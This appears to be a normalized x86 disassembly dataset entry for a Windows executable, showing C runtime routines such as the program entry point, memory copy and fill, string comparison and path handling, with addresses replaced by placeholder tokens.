imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_40fde1
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_41099c
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_40ce30
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_4119e8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_40ca10
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_4107bf
push esi
call sub_411bd8
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_40fef9
push esi
push edi
mov ebx eax
call sub_411c65
push esi
call sub_410811
add esp 0x20
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_40ca50
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_40e7d9
pop ecx
test eax eax
jne r-xdata
call sub_40fc5c
test eax eax
jne r-xdata
push 0x1c
call sub_40cbb5
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_412297
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_412165
mov [ rw-data ] eax
call sub_411f18
call sub_411e5f
call sub_40c7b7
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_411e07
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_40cbb5
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_41a037
mov [ ebp - 0x60 ] eax
push eax
call sub_40c7e4
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_411c8f
pop ecx
pop ecx
retn
sub_40cbd9
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_40e83e
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_40e89f
pop ecx
pop esi
retn
push esi
call sub_40c218
pop ecx
sub_40cc3f
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_412760
inc eax
push eax
call sub_40bb22
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_412670
pop ecx
pop ecx
pop esi
retn
sub_40cc70
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_40ccd0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_40cd7c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
push 0x19
call sub_40e83e
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4125e0
pop ecx
pop ecx
jmp r-xdata
movzx bx [ esi ]
movzx eax bl
inc esi
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0xc ] bx
jne r-xdata
mov al [ esi ]
test al al
jne r-xdata
xor edx edx
inc edi
mov dh cl
mov dl al
mov [ ebp + 0xc ] edx
and [ ebp + 0xc ] 0x0
jmp r-xdata
push 0x19
call sub_40e89f
cmp bx [ ebp + 0xc ]
pop ecx
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor ecx ecx
inc esi
mov ch bl
mov cl al
mov ebx ecx
xor ebx ebx
jmp r-xdata
push 0x19
call sub_40e89f
pop ecx
xor eax eax
jmp r-xdata
movzx cx [ edi ]
movzx eax cl
inc edi
mov [ ebp + 0xc ] ecx
test [ eax + rw-data ] 0x4
je r-xdata
sub_40ce30
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40ce90 ]
jmp [ ecx * 4 + jump_table_40cf0c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cf78 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40cf78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40d110 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40d018 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d110 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cf78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cf78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cf78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40d110 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d110 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d110 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d110 ]
sub_40d165
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push edi
push 0x19
call sub_40e83e
pop ecx
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c790
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp + 0xc ] eax
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
pop esi
pop ebp
retn
inc ecx
test dl dl
jne r-xdata
mov esi ecx
test esi esi
jmp r-xdata
movzx edi dl
shl eax 0x8
or eax edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov dl [ ecx ]
movzx eax dl
movzx edi al
test [ edi + rw-data ] 0x4
je r-xdata
push 0x19
call sub_40e89f
pop ecx
mov eax esi
pop edi
jne r-xdata
lea esi [ ecx - 0x1 ]
jmp r-xdata
sub_40d1d7
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
push edi
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_412868
pop ecx
pop ecx
cmp [ ebx ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp + 0x10 ]
push ebx
call [ GetFullPathNameA@IAT ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
push 0x104
call sub_40bb22
mov edi eax
pop ecx
test edi edi
jne r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp + 0x10 ] 0x104
call sub_40e7ac
mov [ eax ] 0xc
jmp r-xdata
mov eax edi
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
call sub_40e7ac
mov [ eax ] 0x22
jmp r-xdata
push edi
call sub_40c218
pop ecx
xor eax eax
jmp r-xdata
pop edi
pop ebx
pop ebp
retn
call [ GetLastError@IAT ]
push eax
call sub_40e739
pop ecx
push edi
call sub_40c218
pop ecx
sub_40d27c
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_412760
cmp eax 0x1
pop ecx
jb r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x1 ] 0x3a
jne r-xdata
and [ ebp + 0xc ] 0x0
cmp [ ebx ] 0x0
mov eax ebx
mov esi 0xff
mov [ ebp + 0x8 ] eax
je r-xdata
and [ eax ] 0x0
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov cl [ eax ]
movzx edx cl
test [ edx + rw-data ] 0x4
je r-xdata
inc ebx
inc ebx
jmp r-xdata
push 0x2
push ebx
push esi
call sub_41299b
add esp 0xc
and [ esi + 0x2 ] 0x0
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
and [ ecx ] 0x0
cmp cl 0x2f
je r-xdata
inc eax
jmp r-xdata
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
cmp edi ebx
jb r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp + 0xc ] ecx
cmp cl 0x5c
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
sub eax ebx
cmp eax esi
jae r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
test edi edi
je r-xdata
cmp cl 0x2e
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
push esi
push ebx
push edi
call sub_41299b
add esp 0xc
and [ esi + edi ] 0x0
mov esi eax
mov edi [ ebp + 0x18 ]
test edi edi
je r-xdata
sub edi ebx
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax [ ebp - 0x4 ]
cmp eax esi
jae r-xdata
push edi
push ebx
push [ ebp + 0x14 ]
call sub_41299b
mov eax [ ebp + 0x14 ]
add esp 0xc
and [ edi + eax ] 0x0
mov eax [ ebp + 0x8 ]
mov edi esi
mov ebx [ ebp + 0xc ]
jmp r-xdata
sub edi ebx
cmp edi esi
jb r-xdata
push esi
push [ ebp - 0x4 ]
push edi
call sub_41299b
add esp 0xc
and [ esi + edi ] 0x0
jmp r-xdata
mov esi eax
push edi
push ebx
push [ ebp + 0x10 ]
call sub_41299b
mov eax [ ebp + 0x10 ]
add esp 0xc
and [ edi + eax ] 0x0
mov eax [ ebp + 0x8 ]
mov edi esi
sub_40d3c3
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_40d3e0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
jne r-xdata
push 0x19
call sub_40e83e
mov esi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411850
pop ecx
pop ecx
jmp r-xdata
push 0x19
call sub_40e89f
mov eax [ ebp + 0xc ]
pop ecx
movzx ecx bx
sub eax ecx
neg eax
sbb eax eax
not eax
and eax esi
movzx eax bl
test [ eax + rw-data ] 0x4
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx eax bx
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
inc esi
jmp r-xdata
push 0x19
call sub_40e89f
pop ecx
xor eax eax
jmp r-xdata
movzx ecx bx
movzx eax al
shl ecx 0x8
or ecx eax
cmp [ ebp + 0xc ] ecx
je r-xdata
movzx bx [ esi ]
test bx bx
je r-xdata
push 0x19
call sub_40e89f
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
sub_40d490
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40d4f0 ]
jmp [ ecx * 4 + jump_table_40d56c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d5d8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40d5d8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40d770 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40d678 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d770 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d5d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d5d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40d5d8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40d770 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d770 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d770 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40d770 ]
sub_40d7c5
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_40fef9
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40fde1
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_40d82c
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
push esi
push edi
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
jne r-xdata
push 0x19
call sub_40e83e
dec [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ca50
add esp 0xc
jmp r-xdata
movzx bx [ esi ]
movzx eax bl
inc esi
test [ eax + rw-data ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0xc ] bx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0xc ] ebx
test [ eax + rw-data ] 0x4
jne r-xdata
push 0x19
call sub_40e89f
cmp bx [ ebp + 0xc ]
pop ecx
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov al [ esi ]
dec [ ebp + 0x10 ]
test al al
jne r-xdata
xor edx edx
inc edi
mov dh cl
mov dl al
mov [ ebp + 0xc ] edx
mov [ ebp + 0xc ] ebx
jmp r-xdata
push 0x19
call sub_40e89f
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
dec [ ebp + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
inc esi
mov ch bl
mov cl al
mov ebx ecx
xor ebx ebx
jmp r-xdata
movzx cx [ edi ]
movzx eax cl
inc edi
mov [ ebp + 0xc ] ecx
test [ eax + rw-data ] 0x4
je r-xdata
sub_40d91b
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xff
jbe r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
mov eax ecx
mov [ ebp + 0xb ] cl
shr eax 0x8
cmp [ rw-data ] 0x0
mov [ ebp + 0xa ] al
pop edi
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ecx * 2 ]
and eax 0x4
leave
retn
push 0x4
push ecx
call sub_410aa5
pop ecx
pop ecx
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp + 0xa ]
push 0x2
push eax
push 0x1
call sub_412d7e
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
test [ ebp - 0x4 ] 0x4
je r-xdata
push 0x1
pop eax
leave
retn
sub_40d9aa
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xff
jbe r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
mov eax ecx
mov [ ebp + 0xb ] cl
shr eax 0x8
